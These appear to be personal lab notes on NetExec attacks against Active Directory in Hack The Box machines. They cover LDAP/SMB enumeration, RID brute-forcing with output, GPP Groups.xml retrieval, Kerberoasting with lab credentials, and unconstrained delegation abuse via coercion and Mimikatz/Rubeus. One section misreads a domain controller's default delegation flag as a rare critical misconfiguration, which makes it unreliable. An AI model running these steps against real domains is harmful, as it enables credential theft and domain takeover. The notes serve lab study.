for active directory

nxc ldap ...
nxc smb ...
nxc winrm ...
nxc rdp ...

run all of them, but in this specific order:

- **LDAP First:** 
  to Map the domain
  Use your credentials against the DC to find _where_ else your user might have access or to find _new_ users to target.

- **SMB/WinRM next:** 
  to get a shell / access
  Check if your credentials give you administrative access to the workstations.

- **RDP Last:** Only use RDP if you are stuck and need to see the GUI, or if you need to bypass certain restrictions that only apply to command-line shells.


```
nxc ldap <Target_IP_or_Range> -u < Username > -p < Password > [ Flags/Modules ]

```
geared toward querying the Active Directory database rather than just testing login credentials

to see what information the LDAP server (the Domain Controller) can provide, use these flags:

- **`--users`**: Lists all users in the domain.
    
- **`--groups`**: Lists all groups.
    
- **`--active-users`**: Filters for users that are not disabled.
    
- **`--trusted-for-delegation`**: Finds users/computers with unconstrained delegation (a major attack vector).

#### Password & Policy Info

- **`--pass-pol`**: Checks the domain password policy (lockout threshold, minimum length).
    
- **`--asreproast <output_file>`**: Finds users with "Do not require Kerberos pre-authentication" enabled and saves hashes for cracking.
    
- **`--kerberoasting <output_file>`**: Performs Kerberoasting against Service Principal Names (SPNs).
  
  
  **Domain Flag**: Sometimes NXC needs help knowing which domain to query. If it fails, add the `-d` flag, example: 
  `nxc ldap 10.0.2.x -u username -p 'password' -d activedirectory.local --users`

**Anonymous Bind**: Before we have credentials,  try a "Null Session" or anonymous bind to see if the DC is misconfigured: `nxc ldap < DC-IP > -u '' -p ''`

----

nxc smb 10.129.13.84 -u '' -p '' -M spider_plus

after running nxc smb with -M spider_plus

grep the path to Groups.xml

then do 
smb get

need to output file else will see the Error opening 


grep -i "Groups.xml" /home/lanc3/.nxc/modules/nxc_spider_plus/10.129.13.84.json
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml": {



```
smb: \> get "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml"
Error opening local file active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
smb: \> 
smb: \> get "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml" groups.xml

getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as groups.xml (8.5 KiloBytes/sec) (average 8.5 KiloBytes/sec)
smb: \> 

```



find . -name "groups.xml"

refer to HTB/active


-------

## netexec smb 10.129.231.149 -u 'guest' -p '' --rid-brute

example: in cicada (HTB)

```
netexec smb 10.129.231.149 -u 'guest' -p '' --rid-brute
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)                                                                                                                                           
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.129.231.149  445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)

```

------

## nxc ldap keberoasting module
--kerberoasting

nxc ldap 10.129.13.84 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -d active.htb --kerberoasting output.txt

hint: need to edit /etc/hosts

otherwise will have errors

-------

When you run `nxc ldap <IP> -u <user> -p <pass> --trusted-for-delegation`, you are essentially auditing the Active Directory environment for a specific, dangerous configuration known as **Unconstrained Delegation**.

### What you see in the output

If the tool identifies accounts or computers with this setting, the output will list the **sAMAccountName** and/or **distinguishedName** of the objects where the `TRUSTED_FOR_DELEGATION` flag is set to `True` in their `userAccountControl` attribute.

You will typically see a list formatted like this:

```
[*] Enumerated users/computers trusted for delegation:
[+] <AccountName>
[+] <ComputerName>$

```

### Why this is an attack vector

When an account (usually a machine account or a service account) has this flag enabled, it performs **Unconstrained Delegation**. 
This is a legacy Kerberos feature that presents a massive security risk:

1. **The "TGT Forwarding" Mechanism:** When a user authenticates to a service (like a web server or file share) that is "Trusted for Delegation," the Domain Controller includes the user's **Ticket Granting Ticket (TGT)** inside the service ticket sent to that host.
    
2. **Credential Exposure:** The target server decrypts the TGT and stores it in its memory (LSASS).
    
3. **The Payoff:** If you (as an attacker) compromise that specific server, you can dump the memory of the LSASS process and extract the TGTs of **any user** who has connected to that server.
    
4. **Impersonation:** With a harvested TGT, you can impersonate that user to _any other service_ in the domain, effectively bypassing authentication. If a Domain Administrator connects to that compromised server, you effectively own the entire domain.

- **The "Coerced Authentication" Connection:** You will often find that you cannot "force" a high-privilege user to connect to your compromised machine. However, if you find a machine that is `TRUSTED_FOR_DELEGATION`, you now have a "bridge." You can then use techniques like the **Printer Bug** (or other coercion methods) to force a Domain Controller or a high-privilege service account to authenticate to that machine.
    
- **The Outcome:** Once they authenticate, their TGT is sitting in the memory of the "delegation-trusted" machine you’ve already compromised. You can then use tools like `Mimikatz` or `Rubeus` on that machine to extract the TGT and elevate your access.

Workflow:

- **If it's a Computer:** It is a prime candidate for lateral movement via coercion.

- **If it's a User:** This account is a "golden ticket" if compromised, because it essentially functions as a proxy that can be used to harvest credentials of anyone who interacts with it.
    

**Quick tip:** If you find a machine with this flag, check if you can use it to "bridge" your access from a low-privileged segment to a high-privileged segment using techniques like `PrintNightmare` or simple SMB connections to trigger the authentication.

----

what does this tell us?

```
nxc ldap 10.129.232.88 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --trusted-for-delegation 

LDAP        10.129.232.88   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)

LDAP        10.129.232.88   389    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 

LDAP        10.129.232.88   389    DC01             DC01$
```
This output tells us that **`DC01$` (the Domain Controller's computer account) is configured with "Unconstrained Delegation"** in the `fluffy.htb` domain.

When you run `nxc` with the `--trusted-for-delegation` flag, it queries the `userAccountControl` attribute of objects in Active Directory. Specifically, it is looking for the `ADS_UF_TRUSTED_FOR_DELEGATION` flag.


1. Since the Domain Controller itself is trusted for unconstrained delegation, if you can coerce an account with higher privileges (like a Domain Admin) to authenticate to this DC for a service (like SMB, LDAP, or RPC), that user's TGT will be cached in the DC's memory.
    
2. **High-Risk Exposure:** Because this is the Domain Controller, _every_ service on this machine is inherently high-value. If you compromise this host, you effectively have the ability to intercept the credentials of any domain user who happens to connect to it.
    

 finding unconstrained delegation on a Domain Controller is an "instant win" condition if you can trigger the right authentication.

- **The Workflow:** You don't need to "hack" the DC yet. You need to "trick" a privileged user into connecting to it.
    
- **Common Techniques:** * **Printer Bug / PetitPotam:** If the DC has the Print Spooler service enabled, you can force it to connect to an attacker-controlled machine (or another machine you control) using `dcom` or other RPC methods.
    
    - **Spooler Service:** Even if the DC is the one being delegated to, you are looking to capture the TGT of an admin who connects to services on the DC.
        

### Important Distinction

Note that `nxc` returned `DC01$`. This confirms it is the **Computer Account** that is trusted. This is common in some lab environments or misconfigured enterprise environments, but it is extremely dangerous.

next steps:

1. **Map the services:** Check what services are running on `DC01` (use `nxc smb 10.129.232.88 -u ... -p ... --shares` or `--sessions`).
    
2. **Check for Coercion:** Verify if the `MS-RPRN` (Print Spooler) interface is available, as that is the most common way to trigger the delegation capture.
    
3. **Document the Finding:** In report, this is a "High/Critical" finding. Identified a configuration that allows for full domain compromise via TGT harvesting.
------
